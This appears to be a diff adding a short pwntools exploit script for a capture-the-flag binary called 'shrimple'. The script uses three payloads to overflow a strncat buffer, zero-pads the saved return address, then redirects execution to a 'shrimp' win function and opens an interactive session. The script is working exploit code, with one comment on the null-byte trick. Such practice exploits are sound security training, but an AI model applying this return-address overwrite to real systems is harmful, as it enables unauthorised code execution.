@@ -1,0 +1,23 @@
+from pwn import *
+
+# because strncat func is end when meet "\x00" so must use 2 first time to pad \x00 value to the head of saved RIP
+
+#p = remote("chal.competitivecyber.club", 8884)
+p = process("./shrimple")
+e = ELF("./shrimple")
+win = e.symbols['shrimp']
+
+src = 'so easy and so shrimple, have fun!'
+input()
+
+#0x8877665544332211
+
+payload = b'A' * (0x40 - len(src)) + b'B' * 8 + p64(0xffffffffff)
+p.sendline(payload)
+payload = b'A' * (0x40 - len(src)) + b'B' * 8 + p64(0xffffffff)
+p.sendline(payload)
+payload = b'A' * (0x40 - len(src)) + b'B' * 8 + p64(win)
+p.sendline(payload)
+
+p.interactive()
+
